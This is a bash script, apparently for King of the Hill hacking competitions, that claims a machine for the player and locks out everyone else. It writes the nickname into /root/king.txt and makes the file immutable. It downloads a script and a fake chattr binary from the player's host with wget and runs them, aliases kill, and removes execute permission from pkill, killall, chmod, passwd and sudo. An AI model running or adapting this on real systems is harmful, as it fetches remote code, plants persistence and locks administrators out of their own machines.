#!/bin/bash

# H3X-007 ;)

echo "Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :) I'm kind :D "

echo "Join our Discord Server: https://discord.gg/y3aCGbrT8J"

echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
read -p "Enter your nickname: " nick
read -p "What is vpn ip ?: " IP
echo "Hello $nick :) Let's go"
echo 
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
sudo chmod 0755 /usr/bin/pkexec
set write off
echo 
echo "Patch part successfully ended..."
echo 
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
chmod +x /usr/bin/chattr
sudo chattr -i /root/king.txt
echo "$nick" | sudo tee /root/king.txt >/dev/null
sudo chattr +i /root/king.txt
sudo chmod 400 /root/king.txt
set -o noclobber /root/king.txt
echo 
echo
echo "-----------------------------------------------------------------------------"
echo 
echo "Files Operation Complete... Starting Operation 2..."
echo 
echo "-----------------------------------------------------------------------------"
echo
echo "Let's Go Forward... :)"
echo
echo "-----------------------------------------------------------------------------"
alias kill='echo "Sorry, the kill command is disabled."'
echo "-----------------------------------------------------------------------------"
echo
cd /boot && wget http://$IP/check.sh
chmod +x check.sh
./check.sh "$nick" &
chattr +ai /boot/check.sh
echo
echo "--------------------File successfully running in the background---------------"
echo "-----------------------------------------------------------------------------"
echo
cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
echo
echo "------------------Fake chattr successfully added-----------------"
echo "-----------------------------------------------------------------"
chmod -x /usr/bin/pkill
chmod -x /usr/bin/killall
chmod -x /usr/bin/chmod
chmod -x /usr/bin/passwd
chmod -x /usr/bin/sudo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo
echo "Operation Fully Complete. The KING is $nick ! :) "
echo
echo "--------------Hi $nick don't forget to give us a star on Github--------------"
echo "-----------------------------------------------------------------------------"
